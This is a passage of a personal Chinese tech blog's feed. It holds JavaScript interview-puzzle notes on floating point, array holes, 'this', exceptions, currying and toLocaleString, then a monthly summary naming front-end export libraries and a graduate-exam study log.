class="comment">//111111111111111110000</span></span><br></pre></td></tr></table></figure></li></ul><p>JS的基础类型Number，遵循 IEEE 754 规范，采用双精度存储（double precision），占用 64 bit。<br>1位用来表示符号位，<br>11位用来表示指数，<br>52位表示尾数</p><p>Math.pow(2, 53) == 9007199254740992 是可以表示的最大值. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isSafeInteger(<span class="number">111111111111111110000</span>)<span class="comment">//false</span></span><br></pre></td></tr></table></figure><ul><li>3<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>].reduce(<span class="built_in">Math</span>.pow)<span class="comment">//9</span></span><br></pre></td></tr></table></figure></li></ul><p>表达式等价于 Math.pow(3, 2) =&gt; 9; Math.pow(9, 1) =&gt;9</p><ul><li>4<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line">arr[<span class="number">10</span>]=<span class="number">10</span>;</span><br><span class="line">arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x==<span class="literal">undefined</span>&#125;);<span class="comment">//[]</span></span><br></pre></td></tr></table></figure></li></ul><p>首先检查了这个索引值是不是数组的一个属性, 那么我们测试一下.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">in</span> ary; =&gt; <span class="literal">true</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">in</span> ary; =&gt; <span class="literal">false</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">in</span> ary; =&gt; <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>从 3 - 9 都是没有初始化的’坑’!, 这些索引并不存在与数组中. 在 array 的函数调用的时候是会<code>跳过</code>这些’坑’的,所以它不知道是不是undefined</p><ul><li>5<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    foo:<span class="string">'bar'</span>,</span><br><span class="line">    func:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.foo);</span><br><span class="line">        <span class="built_in">console</span>.log(self.foo);</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.foo);</span><br><span class="line">            <span class="built_in">console</span>.log(self.foo);</span><br><span class="line">        &#125;())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.func();</span><br></pre></td></tr></table></figure></li></ul><p>输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bar</span><br><span class="line">bar</span><br><span class="line">undefined</span><br><span class="line">bar</span><br></pre></td></tr></table></figure></p><ul><li>6<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="number">23</span>;&#125;</span><br><span class="line"><span class="keyword">typeof</span> g();</span><br></pre></td></tr></table></figure></li></ul><p>输出<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Chrome:</span></span><br><span class="line"><span class="keyword">typeof</span> g() <span class="comment">//无输出响应</span></span><br><span class="line"><span class="keyword">typeof</span> g   <span class="comment">//undefined</span></span><br><span class="line"><span class="keyword">typeof</span> f() <span class="comment">//number</span></span><br><span class="line"><span class="keyword">typeof</span> f   <span class="comment">//function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Firfox</span></span><br><span class="line"><span class="keyword">typeof</span> g() <span class="comment">//无输出响应</span></span><br><span class="line"><span class="keyword">typeof</span> g   <span class="comment">//undefined</span></span><br><span class="line"><span class="keyword">typeof</span> f() <span class="comment">//number</span></span><br><span class="line"><span class="keyword">typeof</span> f   <span class="comment">//function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//IE8</span></span><br><span class="line"><span class="keyword">typeof</span> g() <span class="comment">//number</span></span><br><span class="line"><span class="keyword">typeof</span> g   <span class="comment">//function</span></span><br><span class="line"><span class="keyword">typeof</span> f() <span class="comment">//number</span></span><br><span class="line"><span class="keyword">typeof</span> f   <span class="comment">//function</span></span><br></pre></td></tr></table></figure></p><ul><li><p>7 重点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">5</span>); <span class="comment">// 7</span></span><br><span class="line">add(<span class="number">2</span>)(<span class="number">5</span>); <span class="comment">// 7</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addto</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> length = <span class="built_in">arguments</span>.length;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">        sum += <span class="built_in">arguments</span>[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value = addto.apply(add,<span class="built_in">arguments</span>);</span><br><span class="line">    <span class="keyword">var</span> helper = <span class="function"><span class="keyword">function</span>(<span class="params">next</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">typeof</span> next == <span class="string">"number"</span> ? value+=next:value;</span><br><span class="line">        <span class="keyword">return</span> helper</span><br><span class="line">    &#125;</span><br><span class="line">    helper.valueOf = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> helper;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>8</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="number">0</span><span class="comment">//undefined</span></span><br><span class="line"><span class="keyword">void</span>(<span class="number">0</span>)<span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></li><li><p>9</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>;<span class="comment">//window</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    func : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.func();<span class="comment">//obj</span></span><br></pre></td></tr></table></figure></li><li><p>抛出的异常找最近的catch</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'oops'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'finally'</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(ex)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'outer'</span>,ex.message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>输出 finally outer oops</p><ul><li>抛出的异常只需处理一次<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'oops'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(ex)&#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'inner'</span>,ex.message);</span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'finally'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(ex)&#123;</span><br><span class="line">    <span class="built_in">console</span>.error(<span class="string">'outer'</span>,ex.message)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>输出 inner oops finally</p><ul><li>12<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd();<span class="comment">//true</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fd</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//do sth</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fe();<span class="comment">//TypeError</span></span><br><span class="line"><span class="keyword">var</span> fe = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//do sth</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>13<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myarr2 = <span class="keyword">new</span> </span><br><span class="line"><span class="built_in">Array</span>(<span class="string">"80"</span>,<span class="string">"16"</span>,<span class="string">"50"</span>,<span class="string">"6"</span>,<span class="string">"100"</span>,<span class="string">"1"</span>);</span><br><span class="line"><span class="built_in">document</span>.write(myarr2.sort());<span class="comment">//1,100,16,50,6,80</span></span><br></pre></td></tr></table></figure></li></ul><p>原因 ：因为按unicode码顺序排列。如要实现排序，就必须手写排序函数</p><img src="/study/Comprehensive/js-problem/1.png"><img src="/study/Comprehensive/js-problem/2.png"><img src="/study/Comprehensive/js-problem/3.png"><img src="/study/Comprehensive/js-problem/4.png"><img src="/study/Comprehensive/js-problem/5.png"><img src="/study/Comprehensive/js-problem/6.png"><img src="/study/Comprehensive/js-problem/7.png"><p>什么是普通对象？？？<br><img src="/study/Comprehensive/js-problem/8.png"><br><img src="/study/Comprehensive/js-problem/9.png"></p><p>为什么result先输出？？？？<br><img src="/study/Comprehensive/js-problem/10.png"></p><h2 id="你知道为什么会有-Generator-吗"><a href="#你知道为什么会有-Generator-吗" class="headerlink" title="你知道为什么会有 Generator 吗?"></a>你知道为什么会有 Generator 吗?</h2><p><a href="https://juejin.im/post/5adae8246fb9a07aa541e150" target="_blank" rel="noopener">你知道为什么会有 Generator 吗</a></p><h2 id="柯里化–部分求值"><a href="#柯里化–部分求值" class="headerlink" title="柯里化–部分求值"></a>柯里化–部分求值</h2><p>柯里化又称部分求值，柯里化函数会接收一些参数，然后不会立即求值，而是继续返回一个新函数，将传入的参数通过闭包的形式保存，等到被真正求值的时候，再一次性把所有传入的参数进行求值<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通用的柯里化函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> slice = <span class="built_in">Array</span>.prototype.slice,  <span class="comment">// 将slice缓存起来</span></span><br><span class="line">        args = slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);   <span class="comment">// 这里将arguments转成数组并保存</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 将新旧的参数拼接起来</span></span><br><span class="line">        <span class="keyword">let</span> newArgs = args.concat(slice.call(<span class="built_in">arguments</span>));    </span><br><span class="line">        <span class="keyword">return</span> fn.apply(<span class="literal">null</span>, newArgs); <span class="comment">// 返回执行的fn并传递最新的参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ES6版的柯里化函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> g = <span class="function">(<span class="params">...allArgs</span>) =&gt;</span> allArgs.length &gt;= fn.length ?</span><br><span class="line">        fn(...allArgs) : </span><br><span class="line">        (...args) =&gt; g(...allArgs, ...args)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试用例</span></span><br><span class="line"><span class="keyword">const</span> foo = curry(<span class="function">(<span class="params">a, b, c, d</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a, b, c, d);</span><br><span class="line">&#125;);</span><br><span class="line">foo(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>)(<span class="number">4</span>);    <span class="comment">// 1 2 3 4</span></span><br><span class="line"><span class="keyword">const</span> f = foo(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>);</span><br><span class="line">f(<span class="number">5</span>);               <span class="comment">// 1 2 3 5</span></span><br></pre></td></tr></table></figure></p><h2 id="反柯里化-函数的借用"><a href="#反柯里化-函数的借用" class="headerlink" title="反柯里化-函数的借用"></a>反柯里化-函数的借用</h2><p>简而言之就是函数的借用，天下函数(方法)大家用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写法一</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.uncurrying = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> self = <span class="keyword">this</span>;    </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> obj = <span class="built_in">Array</span>.prototype.shift.call(<span class="built_in">arguments</span>);<span class="comment">//删除并返回</span></span><br><span class="line">        <span class="keyword">return</span> self.apply(obj, <span class="built_in">arguments</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//写法二</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.uncurrying = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Function</span>.prototype.call.apply(self, <span class="built_in">arguments</span>);</span><br><span class="line">        <span class="comment">/*相当于Function.prototype.call.apply(Array.prototype.slice, arguments);</span></span><br><span class="line"><span class="comment">        也就是相当于Array.prototype.slice.call(arguments)*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试一</span></span><br><span class="line"><span class="keyword">let</span> slice = <span class="built_in">Array</span>.prototype.slice.uncurrying();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = slice(<span class="built_in">arguments</span>);  </span><br><span class="line">    <span class="built_in">console</span>.log(result);    <span class="comment">// [1, 2, 3]</span></span><br><span class="line">&#125;)(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试二</span></span><br><span class="line"><span class="keyword">let</span> slice = <span class="built_in">Array</span>.prototype.push.uncurrying();</span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="string">'length'</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">'0'</span>: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line">push(obj, <span class="number">110</span>);</span><br><span class="line"><span class="built_in">console</span>.log(obj);   <span class="comment">// &#123; '0': 1, '1': 110, length: 2 &#125;</span></span><br></pre></td></tr></table></figure></p><h2 id="数字类型的-toLocaleString"><a href="#数字类型的-toLocaleString" class="headerlink" title="数字类型的 toLocaleString"></a>数字类型的 toLocaleString</h2><p>minimumIntegerDigits、 minimumFractionDigits 与 maximumFractionDigits，用于指定整数最少位数与小数的最少和最多位数，不够则用0去凑。简单说，自动补0！</p><p>minimumSignificantDigits 与 maximumSignificantDigits，用于控制有效数字位数，只要设置了这一组属性，第一组属性全部忽略不算</p><p>注意，maximumFractionDigits 与 maximumSignificantDigits 均是四舍五入，使用时需要注意。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> num = <span class="number">2333333</span>;</span><br><span class="line">num.toLocaleString();   <span class="comment">// 2,333,333</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">style</span>: <span class="string">'decimal'</span> &#125;);   <span class="comment">//2,333,333</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">style</span>: <span class="string">'percent'</span> &#125;);   <span class="comment">//233,333,300%</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">style</span>: <span class="string">'currency'</span>, <span class="attr">currency</span>: <span class="string">'CNY'</span> &#125;);    <span class="comment">//￥2,333,333.00</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">style</span>: <span class="string">'currency'</span>, <span class="attr">currency</span>: <span class="string">'cny'</span>, <span class="attr">currencyDisplay</span>: <span class="string">'code'</span> &#125;);      <span class="comment">//CNY2,333,333.00</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">style</span>: <span class="string">'currency'</span>, <span class="attr">currency</span>: <span class="string">'cny'</span>, <span class="attr">currencyDisplay</span>: <span class="string">'name'</span> &#125;);      <span class="comment">//2,333,333.00人民币</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">minimumIntegerDigits</span>: <span class="number">5</span> &#125;);        <span class="comment">//02,333.3</span></span><br><span class="line"><span class="comment">//如果不想有分隔符，可以指定useGrouping为false</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">minimumIntegerDigits</span>: <span class="number">5</span>, <span class="attr">useGrouping</span>: <span class="literal">false</span> &#125;);        <span class="comment">//02333.3</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">minimumFractionDigits</span>: <span class="number">2</span>, <span class="attr">useGrouping</span>: <span class="literal">false</span> &#125;);     <span class="comment">//2333.30</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">666.666</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">maximumFractionDigits</span>: <span class="number">2</span>, <span class="attr">useGrouping</span>: <span class="literal">false</span> &#125;);     <span class="comment">//666.67</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> num = <span class="number">1234.5</span>;</span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">minimumSignificantDigits</span>: <span class="number">6</span>, <span class="attr">useGrouping</span>: <span class="literal">false</span> &#125;);      <span class="comment">//1234.50</span></span><br><span class="line">num.toLocaleString(<span class="string">'zh'</span>, &#123; <span class="attr">maximumSignificantDigits</span>: <span class="number">4</span>, <span class="attr">useGrouping</span>: <span class="literal">false</span> &#125;);      <span class="comment">//1235</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ceshi986745/article/details/51698893&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;44个Javascript变态题解析&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;fo
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="面试" scheme="http://lry1994.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="js" scheme="http://lry1994.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>2018-5月总结</title>
    <link href="http://lry1994.github.io/study/2018/5/suibi.html"/>
    <id>http://lry1994.github.io/study/2018/5/suibi.html</id>
    <published>2018-04-30T16:00:00.000Z</published>
    <updated>2018-08-30T02:32:56.367Z</updated>
    
    <content type="html"><![CDATA[<h3 id="发现三个很厉害的库"><a href="#发现三个很厉害的库" class="headerlink" title="发现三个很厉害的库"></a>发现三个很厉害的库</h3><p><code>htmlDocx</code> (将html代码导出为doc文件)’<a href="http://evidenceprime.github.io/html-docx-js/build/html-docx.js&#39;" target="_blank" rel="noopener">http://evidenceprime.github.io/html-docx-js/build/html-docx.js&#39;</a><br><code>saveAs`(将浏览器内存中的doc文件保存至硬盘)&#39;http://evidenceprime.github.io/html-docx-js/test/vendor/FileSaver.js&#39;</code>domtoimage<code></code>(将dom节点转化成为图片)’<a href="https://cdnjs.cloudflare.com/ajax/libs/dom-to-image/2.6.0/dom-to-image.min.js&#39;" target="_blank" rel="noopener">https://cdnjs.cloudflare.com/ajax/libs/dom-to-image/2.6.0/dom-to-image.min.js&#39;</a></p><p>domtoimage.toPng(dom); //转出来是base64<br>saveAs(htmlDocx.asBlob(html), filename); </p><p>主要这三个库方法<br>domtoimage.toPng<br>saveAs<br>htmlDocx.asBlob  </p><h3 id="Vue的router的push传递参数有没有不把参数展示在url中的传递方式？"><a href="#Vue的router的push传递参数有没有不把参数展示在url中的传递方式？" class="headerlink" title="Vue的router的push传递参数有没有不把参数展示在url中的传递方式？"></a>Vue的router的push传递参数有没有不把参数展示在url中的传递方式？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const userId = 123</span><br><span class="line">router.push(&#123; name: &apos;user&apos;, params: &#123; userId &#125;&#125;)</span><br><span class="line">// 路由设置 path 为：&apos;/user/:userId&apos;</span><br><span class="line">// 跳转路径：&apos;/user/123&apos;</span><br><span class="line"></span><br><span class="line">// 路由设置 path 为：&apos;/user&apos;</span><br><span class="line">// 跳转路径：&apos;/user&apos;</span><br><span class="line">// this.$route.params.userId 获取userId</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;发现三个很厉害的库&quot;&gt;&lt;a href=&quot;#发现三个很厉害的库&quot; class=&quot;headerlink&quot; title=&quot;发现三个很厉害的库&quot;&gt;&lt;/a&gt;发现三个很厉害的库&lt;/h3&gt;&lt;p&gt;&lt;code&gt;htmlDocx&lt;/code&gt; (将html代码导出为doc文件)’&lt;a
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="每月总结" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%AF%8F%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>考研</title>
    <link href="http://lry1994.github.io/study/2018/4/kaoyan.html"/>
    <id>http://lry1994.github.io/study/2018/4/kaoyan.html</id>
    <published>2018-04-27T16:00:00.000Z</published>
    <updated>2018-05-07T03:16:12.630Z</updated>
    
    <content type="html"><![CDATA[<p>2018.3.9下定决心考研</p><p>2018.3.11-2018.4.20<br>看张宇的高数基础视频（1-20）和18讲视频（1-14），看完一章基础视频就看对应章节的18讲视频，并刷一遍18讲书上的题目<br>因为16-18讲涉及到线性代数的东西，所以先不看。</p><p>2018.4.21-2018.5.6<br>先是看张宇的线代基础视频（1-6），内容不多，主要是介绍行列式的计算方法<br>张宇的2019新版基础班(7-13),前面内容和张宇的线代基础视频（1-6）差不多，所以1-6就没看了。<br>有想看李永乐的视频，但是觉得李老师的节奏有点慢，看不下去了。</p><p>2018.5.8-<br>开始概率论吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2018.3.9下定决心考研&lt;/p&gt;
&lt;p&gt;2018.3.11-2018.4.20&lt;br&gt;看张宇的高数基础视频（1-20）和18讲视频（1-14），看完一章基础视频就看对应章节的18讲视频，并刷一遍18讲书上的题目&lt;br&gt;因为16-18讲涉及到线性代数的东西，所以先不看。&lt;
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
